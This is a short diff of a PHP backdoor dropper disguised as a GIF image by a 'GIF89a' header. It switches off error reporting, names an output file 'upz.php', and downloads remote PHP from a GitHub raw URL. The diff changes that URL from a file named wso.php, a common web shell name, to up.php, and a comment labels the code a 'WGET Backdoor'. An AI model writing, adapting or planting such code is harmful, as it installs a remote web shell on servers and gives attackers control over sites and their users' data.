@@ -2,7 +2,7 @@ GIF89a;
 <?php
 error_reporting(0);
 $filename="upz.php";
-$fget=file_get_contents("https://raw.githubusercontent.com/kalix-Ru/uploads/master/wso.php");
+$fget=file_get_contents("https://raw.githubusercontent.com/kalix-Ru/uploads/master/up.php");
 
 // WGET Backdoor
 $path=getcwd().DIRECTORY_SEPARATOR;
